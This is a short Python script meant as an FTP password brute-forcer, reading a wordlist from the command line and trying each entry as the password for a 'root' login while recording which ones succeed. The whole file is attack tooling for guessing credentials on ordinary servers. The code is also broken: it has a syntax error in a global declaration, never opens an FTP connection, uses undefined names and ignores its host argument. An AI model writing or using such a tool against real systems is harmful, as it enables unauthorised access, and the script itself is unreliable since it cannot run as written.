#!/usr/bin/python
import ftplib
import sys

 
def standardlog():
   try:
       direc = ftp.nlst()
   except:
       direc = []
       print("[*] could not get dir content")
       return 
   retList = []
   for FileName in direc:
      fn = FileName.lower()
      print(fn)
      retList.append(fn)
   return retList      
def brutelogPass(host,lista):
   lt = open(lista, 'r')
   motho = lt
   found = 0
   ValidCreds = []
   global fdd = "greedy"
   count = 0
   for ln in motho.readlines():
   
      try:          
          ftp.login(root,ln)
          print("[*] login success"+str(ln))
          found = 1
          ValidCreds.append(ln)
          count += 1
      except:
          print("[*]login fail...."+" "+str(ln)) 
          found = 0
               
   return found                      
lista = sys.argv[1]
host = sys.argv[2]
brutelogPass(host,lista)

  
